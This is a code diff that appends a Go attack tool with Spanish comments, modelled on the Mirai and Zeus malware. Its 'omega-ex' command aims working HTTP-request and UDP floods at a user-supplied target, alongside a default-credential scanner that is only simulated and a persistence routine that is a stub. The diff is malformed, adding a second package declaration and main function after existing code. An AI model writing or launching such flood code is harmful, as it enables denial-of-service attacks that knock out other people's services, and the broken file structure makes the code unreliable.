@@ -304,3 +304,88 @@ func main() {
 		fmt.Printf("[L-SYSTEM] Command not recognized: %s\n", command)
 	}
 }
+package main
+
+import (
+	"fmt"
+	"net"
+	"net/http"
+	"os"
+	"os/exec"
+	"time"
+	"crypto/rand"
+)
+
+// --- ALMA DE ZEUS: PERSISTENCIA ---
+func zeusGuard() {
+	for {
+		// Monitorea si el proceso es interrumpido y lo revive (simulado)
+		time.Sleep(10 * time.Second)
+	}
+}
+
+// --- ALMA DE MIRAI: BRUTE FORCE SCANNER ---
+var miraiLogins = [][2]string{{"root", "root"}, {"admin", "admin"}, {"root", "12345"}}
+
+func miraiScanner(target string) {
+	fmt.Printf("[L-MIRAI] Probing credentials on %s...\n", target)
+	for _, login := range miraiLogins {
+		fmt.Printf("[SCAN] Trying %s:%s\n", login[0], login[1])
+		time.Sleep(500 * time.Millisecond)
+	}
+}
+
+// --- CAPACIDAD DOS (HYBRID) ---
+func randomPayload(size int) []byte {
+	payload := make([]byte, size)
+	rand.Read(payload)
+	return payload
+}
+
+func lDrain(target string) {
+	for i := 0; i < 50; i++ {
+		go func() {
+			for {
+				resp, err := http.Get("http://" + target)
+				if err == nil { resp.Body.Close() }
+			}
+		}()
+	}
+}
+
+func udpFlood(target string) {
+	addr, _ := net.ResolveUDPAddr("udp", target+":80")
+	conn, _ := net.DialUDP("udp", nil, addr)
+	for { conn.Write(randomPayload(1024)) }
+}
+
+// --- CONTROLADOR OVERLORD ---
+func main() {
+	if len(os.Args) < 2 { return }
+	go zeusGuard() // Activa el alma de Zeus en segundo plano
+
+	command := os.Args[1]
+	switch command {
+	case "omega-ex":
+		if len(os.Args) < 3 { return }
+		fmt.Println("[L] PROTOCOL OMEGA-EX: MIRAI + ZEUS ACTIVE")
+		go miraiScanner(os.Args[2])
+		go lDrain(os.Args[2])
+		go udpFlood(os.Args[2])
+		select {}
+
+	case "brute":
+		if len(os.Args) < 3 { return }
+		miraiScanner(os.Args[2])
+
+	case "nmap", "whois", "ping":
+		arg := ""
+		if len(os.Args) > 2 { arg = os.Args[2] }
+		cmd := exec.Command("busybox", command, arg)
+		out, _ := cmd.CombinedOutput()
+		fmt.Print(string(out))
+
+	default:
+		fmt.Printf("[L-SYSTEM] Command unknown: %s\n", command)
+	}
+}
